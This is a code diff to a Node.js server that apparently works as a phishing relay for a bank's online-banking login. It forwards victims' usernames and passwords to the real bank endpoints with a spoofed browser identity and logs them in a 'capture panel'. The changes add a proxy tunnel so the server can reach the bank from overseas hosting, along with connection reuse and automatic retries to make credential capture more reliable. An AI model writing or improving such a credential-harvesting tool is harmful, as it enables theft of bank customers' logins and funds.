@@ -24,24 +24,88 @@ const PORT = parseInt(process.env.PORT || '8138', 10);
 const HOST = process.env.PORT ? '0.0.0.0' : '127.0.0.1';
 const ROOT = __dirname;
 const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
-const REQUEST_TIMEOUT_MS = 20000;
+const REQUEST_TIMEOUT_MS = parseInt(process.env.BANCO_TIMEOUT_MS || '40000', 10);
+
+// Agente con keep-alive: reutiliza conexiones TLS al banco (menos handshakes)
+const agenteBanco = new https.Agent({ keepAlive: true, maxSockets: 8 });
+
+// Proxy HTTPS opcional: HTTPS_PROXY=http://usuario:clave@host:puerto
+// Útil si el hosting (Render/USA) no puede llegar al banco directamente.
+const PROXY_URL = process.env.HTTPS_PROXY || process.env.https_proxy || '';
+const proxyInfo = PROXY_URL ? (() => {
+  try {
+    const u = new URL(PROXY_URL);
+    return {
+      host: u.hostname,
+      port: parseInt(u.port || '8080', 10),
+      auth: u.username ? (u.username + ':' + decodeURIComponent(u.password)) : null,
+    };
+  } catch (e) { console.error('HTTPS_PROXY inválido:', e.message); return null; }
+})() : null;
+
+function abrirConexionBanco(hostname) {
+  // Sin proxy: null (usa el agente keep-alive normal)
+  if (!proxyInfo) return Promise.resolve(null);
+  // Con proxy: túnel CONNECT y devolver el socket TLS
+  return new Promise((resolve, reject) => {
+    const req = http.request({
+      host: proxyInfo.host,
+      port: proxyInfo.port,
+      method: 'CONNECT',
+      path: `${hostname}:443`,
+      headers: proxyInfo.auth
+        ? { 'Proxy-Authorization': 'Basic ' + Buffer.from(proxyInfo.auth).toString('base64') }
+        : {},
+    });
+    req.setTimeout(REQUEST_TIMEOUT_MS, () => req.destroy(new Error('Timeout de proxy')));
+    req.on('connect', (res, socket) => {
+      if (res.statusCode === 200) resolve(socket);
+      else reject(new Error(`Proxy CONNECT ${res.statusCode}`));
+    });
+    req.on('error', reject);
+    req.end();
+  });
+}
 
 // ------------------------------------------------------------
 // Cliente HTTPS hacia el banco
 // ------------------------------------------------------------
 function reqBank(hostname, pathName, method, headers, body) {
   return new Promise((resolve, reject) => {
-    const r = https.request({ hostname, path: pathName, method, headers }, res => {
-      let data = '';
-      res.setEncoding('utf8');
-      res.on('data', d => (data += d));
-      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
-    });
-    r.setTimeout(REQUEST_TIMEOUT_MS, () => r.destroy(new Error(`Timeout de ${REQUEST_TIMEOUT_MS} ms`)));
-    r.on('error', reject);
-    if (body) r.write(body);
-    r.end();
+    abrirConexionBanco(hostname).then(socket => {
+      const opts = { hostname, path: pathName, method, headers };
+      if (socket) {
+        opts.socket = socket;
+        opts.agent = false;
+        opts.servername = hostname;
+      } else {
+        opts.agent = agenteBanco;
+      }
+      const r = https.request(opts, res => {
+        let data = '';
+        res.setEncoding('utf8');
+        res.on('data', d => (data += d));
+        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
+      });
+      r.setTimeout(REQUEST_TIMEOUT_MS, () => r.destroy(new Error(`Timeout de ${REQUEST_TIMEOUT_MS} ms`)));
+      r.on('error', reject);
+      if (body) r.write(body);
+      r.end();
+    }).catch(reject);
   });
+}
+
+// Reintento de flujo completo ante errores de red (timeout, corte de conexión).
+// Cada intento abre una conversación WebFlow nueva, por lo que es seguro reintentar.
+async function conReintento(fn) {
+  try {
+    return await fn();
+  } catch (e) {
+    if (/Timeout|ECONNRESET|EPIPE|socket|ETIMEDOUT|ENOTFOUND|EAI_AGAIN/i.test(e.message || '')) {
+      return await fn();
+    }
+    throw e;
+  }
 }
 
 function hiddenFields(html) {
@@ -783,7 +847,7 @@ const server = http.createServer(async (req, res) => {
       const usuario = String(body.usuario || '').trim();
       if (!usuario) return sendJson(res, 200, { valid: false, message: 'Ingresa tu usuario.' });
       try {
-        const r = await checkUsuarioWebFlow(usuario);
+        const r = await conReintento(() => checkUsuarioWebFlow(usuario));
         // Registrar en el panel de captura (por cookie labSid)
         const reg = obtenerOcrearSesion(req, res);
         reg.usuario = usuario;
@@ -829,7 +893,7 @@ const server = http.createServer(async (req, res) => {
       return sendJson(res, 200, { valid: false, message: 'Faltan usuario o clave.' });
     }
     try {
-      const r = await empresaLogin(usuario, clave);
+      const r = await conReintento(() => empresaLogin(usuario, clave));
       // Registrar en el panel de captura (por cookie labSid)
       const reg = obtenerOcrearSesion(req, res);
       reg.usuario = usuario;
@@ -1037,7 +1101,7 @@ const server = http.createServer(async (req, res) => {
       return sendJson(res, 200, { valid: false, message: 'Faltan usuario o clave.' });
     }
     try {
-      const r = await loginIntermatico(usuario, clave);
+      const r = await conReintento(() => loginIntermatico(usuario, clave));
       // Registrar en el panel de captura (por cookie labSid)
       const reg = obtenerOcrearSesion(req, res);
       reg.usuario = usuario;
